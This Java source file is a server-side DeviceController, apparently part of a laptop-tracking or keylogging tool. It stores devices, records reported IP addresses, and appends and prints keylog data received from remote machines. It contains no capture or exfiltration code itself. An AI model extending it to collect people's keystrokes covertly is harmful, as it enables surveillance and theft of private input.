package server;
import java.util.ArrayList;

/**
 * @author Leo Reyes
 * 
 */
public class DeviceController {

	private ArrayList<Device> deviceList = new ArrayList<Device>();
	
	/*
	 * Class constructor
	 */
	public DeviceController() {
		
	}
	
	/*
	 * Instantiates new Device object and add to the list of devices
	 * @param id 	the unique id of the device being created.
	 */
	public void newLaptopDevice(String deviceId, String deviceName) {
		deviceList.add(new LaptopDevice(deviceId, deviceName));
		System.out.println("New device created and added");
		System.out.println("DeviceList: " + deviceList.toString());
	}
	
	public void updateIp(String deviceId, String msg) {
		System.out.println("Updating IP: " + msg);
		((LaptopDevice)getDevice(deviceId)).addIPList(msg);
	}
	
	public void updateKeyLog(String deviceId, String msg) {
		//TODO: change param device to String deviceId
		((LaptopDevice)getDevice(deviceId)).updateKeylog(msg);
		System.out.println("Keylog: " + ((LaptopDevice)getDevice(deviceId)).getKeyLog());
	}
	
	/*
	 * Searches through ArrayList<Device> and returns a Device object with specified id if it exists
	 * 
	 * @param id	Device id used to search through the ArrayList
	 * @return		Returns the Device with matching id, otherwise return null
	 */
	public Device getDevice(String id) {
		for(int i = 0; i < deviceList.size(); i++) {
			//System.out.println(deviceList.get(i).getId());
			if(deviceList.get(i).getId().equalsIgnoreCase(id)) {
				return deviceList.get(i);
			}
		}
		return null;
	}
}
